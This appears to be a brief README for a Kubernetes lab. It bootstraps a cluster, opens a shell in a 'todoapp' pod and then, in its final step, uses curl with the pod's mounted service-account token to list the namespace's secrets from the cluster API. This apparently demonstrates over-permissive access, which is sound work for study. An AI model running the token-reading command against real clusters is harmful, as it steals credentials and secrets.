### Create the cluster
```
chmod +x bootstrap.sh
./bootstrap.sh
```
### Enter in the pod by interative mode
```
kubectl exec todoapp-9976fd75-2wr7w -it -n todoapp -- sh
```
### Get access to secrets
```
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
https://kubernetes.default.svc/api/v1/namespaces/todoapp/secrets  
```